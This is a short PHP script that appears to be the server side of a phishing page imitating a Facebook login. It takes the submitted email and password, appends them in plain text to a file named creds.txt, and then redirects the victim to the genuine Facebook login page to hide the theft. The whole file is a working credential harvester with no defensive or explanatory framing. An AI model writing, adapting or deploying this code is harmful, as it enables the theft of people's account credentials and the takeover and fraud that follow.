<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = isset($_POST['email']) ? $_POST['email'] : 'No Email';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : 'No Password';

    $creds = "Email: " . $email . "\nPassword: " . $pass . "\n\n";

    // Save credentials into creds.txt
    file_put_contents('creds.txt', $creds, FILE_APPEND);

    // Redirect the user to a real login page or just refresh
    header('Location: https://facebook.com/login/');
    exit();
}
?>
